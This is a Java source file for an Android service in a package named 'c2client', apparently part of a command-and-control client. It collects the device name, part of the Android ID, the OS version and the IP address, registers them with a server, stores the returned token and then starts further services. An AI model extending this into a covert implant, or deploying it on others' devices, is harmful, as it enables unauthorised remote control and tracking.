package com.astra.c2client;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import androidx.annotation.Nullable;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.net.NetworkInterface;
import java.text.SimpleDateFormat;
import java.util.Collections;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

public class DeviceRegisterService extends Service {
    private static final String TAG = "AstraC2-Register";
    
    private Executor executor;
    private SharedPreferences sharedPreferences;
    
    @Override
    public void onCreate() {
        super.onCreate();
        executor = Executors.newSingleThreadExecutor();
        sharedPreferences = getSharedPreferences(Config.PREFS_NAME, MODE_PRIVATE);
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Check if already registered
        if (sharedPreferences.contains(Config.PREF_DEVICE_ID) && 
            sharedPreferences.contains(Config.PREF_AUTH_TOKEN)) {
            // Already registered, start other services
            ServiceManager.startAllServices(this);
            stopSelf();
            return START_NOT_STICKY;
        }
        
        // Not registered, do the registration
        executor.execute(this::registerDevice);
        
        return START_NOT_STICKY;
    }
    
    private void registerDevice() {
        try {
            // Gather device info
            String deviceName = getDeviceName();
            String osVersion = "Android " + Build.VERSION.RELEASE;
            String ipAddress = getDeviceIpAddress();
            
            // Prepare the request parameters
            Map<String, String> params = new HashMap<>();
            params.put("device_name", deviceName);
            params.put("os", osVersion);
            params.put("ip_address", ipAddress);
            
            // Send the registration request
            try {
                JSONObject response = ApiClient.sendPostRequest(Config.ENDPOINT_REGISTER, params);
                
                logToMain("Registration response: " + response.toString());
                
                if (response.has("device_id") && response.has("auth_token")) {
                    // Save the device ID and auth token
                    String deviceId = response.getString("device_id");
                    String authToken = response.getString("auth_token");
                    
                    SharedPreferences.Editor editor = sharedPreferences.edit();
                    editor.putString(Config.PREF_DEVICE_ID, deviceId);
                    editor.putString(Config.PREF_AUTH_TOKEN, authToken);
                    editor.putBoolean(Config.PREF_SERVICES_RUNNING, true);
                    editor.apply();
                    
                    logToMain("Device registered successfully. ID: " + deviceId);
                    
                    // Start the other services
                    ServiceManager.startAllServices(this);
                } else {
                    logToMain("Registration failed: Invalid response");
                }
            } catch (IOException | JSONException e) {
                logToMain("Registration error: " + e.getMessage());
                Log.e(TAG, "Registration error", e);
            }
        } finally {
            // Stop this service
            stopSelf();
        }
    }
    
    private String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        
        if (model.startsWith(manufacturer)) {
            return capitalize(model) + " (" + deviceId.substring(0, 4) + ")";
        } else {
            return capitalize(manufacturer) + " " + model + " (" + deviceId.substring(0, 4) + ")";
        }
    }
    
    private String capitalize(String s) {
        if (s == null || s.length() == 0) {
            return "";
        }
        char first = s.charAt(0);
        if (Character.isUpperCase(first)) {
            return s;
        } else {
            return Character.toUpperCase(first) + s.substring(1);
        }
    }
    
    private String getDeviceIpAddress() {
        try {
            for (NetworkInterface networkInterface : Collections.list(NetworkInterface.getNetworkInterfaces())) {
                for (java.net.InetAddress inetAddress : Collections.list(networkInterface.getInetAddresses())) {
                    if (!inetAddress.isLoopbackAddress() && !inetAddress.isLinkLocalAddress()) {
                        return inetAddress.getHostAddress();
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting IP address", e);
        }
        
        return "";
    }
    
    private void logToMain(String message) {
        Log.d(TAG, message);
        
        Intent intent = new Intent(Config.ACTION_LOG_MESSAGE);
        intent.putExtra(Config.EXTRA_LOG_MESSAGE, message);
        sendBroadcast(intent);
        
        // Update MainActivity log directly if it's in foreground
        if (MainActivity.isActive()) {
            MainActivity mainActivity = MainActivity.getInstance();
            if (mainActivity != null) {
                mainActivity.appendToLog(message);
            }
        }
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
